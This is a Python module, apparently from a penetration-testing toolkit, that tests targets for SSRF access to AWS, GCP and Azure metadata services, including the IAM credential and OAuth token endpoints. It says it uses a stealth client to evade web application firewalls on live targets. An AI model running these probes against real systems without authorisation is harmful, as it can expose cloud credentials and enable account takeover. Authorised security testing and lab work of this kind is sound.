#!/usr/bin/env python3
"""Cloud Metadata Tester

Tests for cloud metadata endpoint access via SSRF.
Supports AWS, GCP, and Azure metadata endpoints.

Uses stealth HTTP client for WAF evasion on live targets.
"""

from typing import Dict, Any, List, Optional

# Import stealth HTTP client for WAF evasion
try:
    from tools.http_client import safe_get, safe_post, get_stealth_session
    USE_STEALTH = True
except ImportError:
    import requests
    USE_STEALTH = False
    
    def safe_get(url, **kwargs):
        return requests.get(url, **kwargs)
    
    def safe_post(url, **kwargs):
        return requests.post(url, **kwargs)


def test_aws_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test AWS metadata endpoint access
    
    Args:
        ssrf_url: URL vulnerable to SSRF
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "aws_metadata",
        "vulnerable": False,
        "evidence": None
    }
    
    metadata_endpoints = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://169.254.169.254/latest/user-data",
    ]
    
    for endpoint in metadata_endpoints:
        try:
            # Inject metadata endpoint into SSRF
            test_url = f"{ssrf_url}?url={endpoint}"
            resp = safe_get(test_url, timeout=10)
            
            # Check for AWS metadata indicators
            content = resp.text.lower()
            aws_indicators = [
                "ami-id",
                "instance-id",
                "instance-type",
                "availability-zone",
                "security-credentials",
                "accesskeyid",
                "secretaccesskey"
            ]
            
            if any(ind in content for ind in aws_indicators):
                result["vulnerable"] = True
                result["evidence"] = {
                    "endpoint": endpoint,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500],
                    "indicators_found": [ind for ind in aws_indicators if ind in content]
                }
                break
        except Exception:
            continue
    
    return result


def test_gcp_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test GCP metadata endpoint access
    
    Args:
        ssrf_url: URL vulnerable to SSRF
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "gcp_metadata",
        "vulnerable": False,
        "evidence": None
    }
    
    metadata_endpoints = [
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://metadata.google.internal/computeMetadata/v1/instance/",
        "http://metadata.google.internal/computeMetadata/v1/project/",
    ]
    
    for endpoint in metadata_endpoints:
        try:
            test_url = f"{ssrf_url}?url={endpoint}"
            resp = safe_get(
                test_url,
                headers={"Metadata-Flavor": "Google"},
                timeout=10
            )
            
            content = resp.text.lower()
            gcp_indicators = [
                "compute",
                "project-id",
                "instance-id",
                "service-account",
                "access-token"
            ]
            
            if any(ind in content for ind in gcp_indicators) or resp.status_code == 200:
                result["vulnerable"] = True
                result["evidence"] = {
                    "endpoint": endpoint,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500]
                }
                break
        except Exception:
            continue
    
    return result


def test_azure_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test Azure metadata endpoint access
    
    Args:
        ssrf_url: URL vulnerable to SSRF
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "azure_metadata",
        "vulnerable": False,
        "evidence": None
    }
    
    metadata_endpoints = [
        "http://169.254.169.254/metadata/instance",
        "http://169.254.169.254/metadata/instance/compute",
        "http://169.254.169.254/metadata/identity/oauth2/token",
    ]
    
    for endpoint in metadata_endpoints:
        try:
            test_url = f"{ssrf_url}?url={endpoint}"
            resp = safe_get(
                test_url,
                headers={"Metadata": "true"},
                timeout=10
            )
            
            content = resp.text.lower()
            azure_indicators = [
                "subscription",
                "resourcegroup",
                "vmname",
                "access_token",
                "azure"
            ]
            
            if any(ind in content for ind in azure_indicators) or resp.status_code == 200:
                result["vulnerable"] = True
                result["evidence"] = {
                    "endpoint": endpoint,
                    "status_code": resp.status_code,
                    "response_snippet": resp.text[:500]
                }
                break
        except Exception:
            continue
    
    return result


def test_direct_metadata_endpoints(base_url: str) -> Dict[str, Any]:
    """Test for directly exposed cloud metadata endpoints (lab simulation)
    
    Args:
        base_url: Base URL of the target
        
    Returns:
        Dict with test results
    """
    results = {
        "test": "direct_metadata",
        "vulnerable": False,
        "findings": []
    }
    
    # Cloud metadata paths that might be exposed directly
    metadata_paths = [
        # AWS-style
        ("/latest/meta-data/", "aws", ["ami-id", "instance-id", "iam"]),
        ("/latest/meta-data/iam/security-credentials/", "aws", ["test-role", "ec2-role"]),
        ("/latest/meta-data/iam/security-credentials/test-role", "aws", ["accesskeyid", "secretaccesskey"]),
        ("/latest/user-data", "aws", ["#!/bin/bash", "userdata"]),
        # GCP-style
        ("/computeMetadata/v1/", "gcp", ["instance", "project"]),
        ("/computeMetadata/v1/instance/service-accounts/default/token", "gcp", ["access_token", "expires"]),
        # Azure-style
        ("/metadata/instance", "azure", ["compute", "vmid", "subscriptionid"]),
        ("/metadata/identity/oauth2/token", "azure", ["access_token", "client_id"]),
        # S3 bucket style
        ("/s3/bucket", "aws", ["bucket", "files", "public"]),
    ]
    
    base = base_url.rstrip("/")
    
    for path, provider, indicators in metadata_paths:
        try:
            url = f"{base}{path}"
            headers = {}
            if provider == "gcp":
                headers["Metadata-Flavor"] = "Google"
            elif provider == "azure":
                headers["Metadata"] = "true"
            
            resp = safe_get(url, headers=headers, timeout=5)
            
            if resp.status_code == 200:
                content = resp.text.lower()
                found_indicators = [ind for ind in indicators if ind.lower() in content]
                
                if found_indicators:
                    results["vulnerable"] = True
                    results["findings"].append({
                        "type": "cloud",
                        "subtype": "metadata_exposure",
                        "provider": provider,
                        "url": url,
                        "path": path,
                        "vulnerable": True,
                        "evidence": {
                            "status_code": resp.status_code,
                            "response_snippet": resp.text[:500],
                            "indicators_found": found_indicators
                        }
                    })
        except Exception:
            continue
    
    return results


def test_cloud_metadata(ssrf_url: str, callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test all cloud metadata endpoints
    
    Args:
        ssrf_url: URL vulnerable to SSRF, or base URL to check for direct exposure
        callback_url: Optional callback URL for OOB detection
        
    Returns:
        Dict with test results for all cloud providers
    """
    results = {
        "vulnerable": False,
        "tests_run": 0,
        "findings": []
    }
    
    # First, test for directly exposed metadata endpoints (lab simulation)
    direct_result = test_direct_metadata_endpoints(ssrf_url)
    results["tests_run"] += 1
    if direct_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].extend(direct_result.get("findings", []))
    
    # Test AWS via SSRF
    aws_result = test_aws_metadata(ssrf_url, callback_url)
    results["tests_run"] += 1
    if aws_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(aws_result)
    
    # Test GCP via SSRF
    gcp_result = test_gcp_metadata(ssrf_url, callback_url)
    results["tests_run"] += 1
    if gcp_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(gcp_result)
    
    # Test Azure via SSRF
    azure_result = test_azure_metadata(ssrf_url, callback_url)
    results["tests_run"] += 1
    if azure_result["vulnerable"]:
        results["vulnerable"] = True
        results["findings"].append(azure_result)
    
    return results

